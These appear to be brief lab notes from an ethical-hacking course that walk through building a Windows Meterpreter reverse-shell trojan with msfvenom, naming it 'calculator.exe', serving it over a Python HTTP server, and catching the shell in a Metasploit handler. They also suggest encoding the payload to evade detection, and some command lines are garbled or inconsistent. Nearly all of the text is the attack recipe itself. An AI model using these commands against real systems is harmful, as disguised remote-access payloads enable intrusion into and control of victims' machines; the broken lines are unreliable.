
`sfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f exe -o calculator.exe


can also use  with encryption so that cant be detected by the firewalls 

`sfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f exe -o  ==-e== calculator.

`mkdir msfvenom-EH2-uni
`cd  msfvenom-EH2-uni
`msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f exe -o calculator.exe
`ls -l
`python -m http.server 80
`msfconsole
`use exploit/multi/handler
`set payload windows/meterpreter/reverse_tcp
`set lhost 192.168.56.105
`set lport 4444
`run






`






